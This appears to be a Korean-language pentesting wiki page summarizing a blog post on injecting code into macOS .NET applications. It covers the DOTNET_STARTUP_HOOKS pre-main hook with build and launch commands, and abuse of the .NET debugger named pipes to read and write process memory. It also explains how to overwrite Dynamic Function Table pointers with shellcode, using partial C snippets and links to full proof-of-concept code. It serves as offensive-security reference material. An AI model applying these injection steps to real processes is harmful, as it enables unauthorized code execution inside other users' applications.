# macOS .Net Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

**이 문서는 [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/) 게시글을 요약한 것입니다. 자세한 내용은 해당 글을 확인하세요!**<sup>[[1]](#references)</sup>

## `DOTNET_STARTUP_HOOKS`

.NET Core 3.0 이상은 `DOTNET_STARTUP_HOOKS` 환경 변수를 지원합니다. 각 경로는 `public static void Initialize()` 메서드를 포함하는 전역 `StartupHook` 타입이 포함된 managed assembly를 가리켜야 합니다. 호스트는 애플리케이션의 `Main` 진입점 전에 해당 assembly를 로드하고 초기화 메서드를 동기적으로 호출하므로, 환경 제어와 함께 읽을 수 있는 DLL을 이용한 직접적인 pre-main code-execution primitive를 제공합니다.<sup>[[2]](#references)</sup>
```csharp
// StartupHook.cs — compile as a class-library assembly.
using System.IO;

internal class StartupHook
{
public static void Initialize()
{
File.WriteAllText("/tmp/dotnet-startup-hook-executed", "executed\n");
}
}
```

```bash
dotnet new classlib -n StartupHookPayload -f net8.0
cp StartupHook.cs StartupHookPayload/Class1.cs
dotnet build StartupHookPayload -c Release

DOTNET_STARTUP_HOOKS="$PWD/StartupHookPayload/bin/Release/net8.0/StartupHookPayload.dll" \
dotnet /path/to/TargetApplication.dll
```
Hook assembly는 애플리케이션의 runtime 및 dependencies와 호환되어야 합니다. directory separator를 포함하는 상대 경로는 거부되므로, 절대 경로 또는 기본 load context에서 확인할 수 있는 assembly name을 사용해야 합니다. Startup hooks는 trimmed application에서 기본적으로 비활성화되며, custom native host는 환경을 상속하는 대신 runtime properties를 직접 제공할 수 있습니다.<sup>[[2]](#references)</sup>

방어적 launcher는 `DOTNET_STARTUP_HOOKS`를 지우고, 신뢰할 수 없는 사용자가 애플리케이션 및 shared assembly 경로에 쓰지 못하도록 방지하며, self-contained deployment와 trimmed deployment를 별도로 테스트해야 합니다.

## .NET Core Debugging <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Establishing a Debugging Session** <a href="#net-core-debugging" id="net-core-debugging"></a>

.NET에서 debugger와 debuggee 간 통신 처리는 [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp)가 담당합니다. 이 component는 [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127)에서 확인할 수 있듯이 각 .NET process에 대해 두 개의 named pipe를 설정하며, 이 pipe는 [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27)를 통해 초기화됩니다. 이 pipe에는 **`-in`** 및 **`-out`** 접미사가 붙습니다.

사용자의 **`$TMPDIR`**을 확인하면 .Net application debugging에 사용할 수 있는 debugging FIFO를 찾을 수 있습니다.

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259)는 debugger로부터의 통신을 관리합니다. 새로운 debugging session을 시작하려면 debugger가 `MessageHeader` struct로 시작하는 message를 `out` pipe를 통해 전송해야 하며, 해당 struct는 .NET source code에 자세히 설명되어 있습니다:
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
새 세션을 요청하려면 다음과 같이 이 struct를 채우고, message type을 `MT_SessionRequest`로, protocol version을 현재 버전으로 설정합니다:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
이 header는 `write` syscall을 사용해 target으로 전송되며, 이어서 세션의 GUID가 포함된 `sessionRequestData` struct가 전송됩니다:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
`out` pipe에서 읽기 작업을 수행하면 debugging session 설정의 성공 또는 실패를 확인할 수 있습니다:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## 메모리 읽기

디버깅 세션이 설정되면 [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896) message type을 사용하여 메모리를 읽을 수 있습니다. 함수 `readMemory`는 읽기 요청을 보내고 응답을 가져오는 데 필요한 단계를 수행하며, 다음과 같이 자세히 설명됩니다:
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
전체 proof of concept (POC)은 [여기](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b)에서 확인할 수 있습니다.

## 메모리 쓰기

마찬가지로 `writeMemory` function을 사용하여 메모리에 쓸 수 있습니다. 이 과정에는 message type을 `MT_WriteMemory`로 설정하고, 데이터의 address와 length를 지정한 다음 데이터를 전송하는 작업이 포함됩니다:
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
연관된 POC는 [여기](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5)에서 확인할 수 있습니다.

## .NET Core Code Execution <a href="#net-core-code-execution" id="net-core-code-execution"></a>

code를 실행하려면 rwx 권한이 있는 memory region을 식별해야 하며, 이는 vmmap -pages를 사용하여 수행할 수 있습니다:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
함수 포인터를 덮어쓸 위치를 찾는 것이 필요하며, .NET Core에서는 **Dynamic Function Table (DFT)** 을 대상으로 지정하여 이를 수행할 수 있습니다. [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h)에 자세히 설명된 이 테이블은 JIT compilation helper functions를 위해 runtime에서 사용됩니다.

x64 systems에서는 signature hunting을 사용하여 `libcorclr.dll`에서 symbol `_hlpDynamicFuncTable`에 대한 reference를 찾을 수 있습니다.

`MT_GetDCB` debugger function은 helper function의 address를 비롯한 유용한 정보를 제공합니다. `m_helperRemoteStartAddr`는 process memory에서 `libcorclr.dll`의 location을 나타냅니다. 그런 다음 이 address를 사용하여 DFT 검색을 시작하고 function pointer를 shellcode의 address로 덮어씁니다.

PowerShell에 injection하는 전체 POC code는 [여기](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6)에서 확인할 수 있습니다.

## References

- [1] [Adam Chester (xpnsec) - Third Party Frameworks를 통한 macOS Injection](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
- [2] [.NET runtime host startup hook 설계](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md)
{{#include ../../../banners/hacktricks-training.md}}
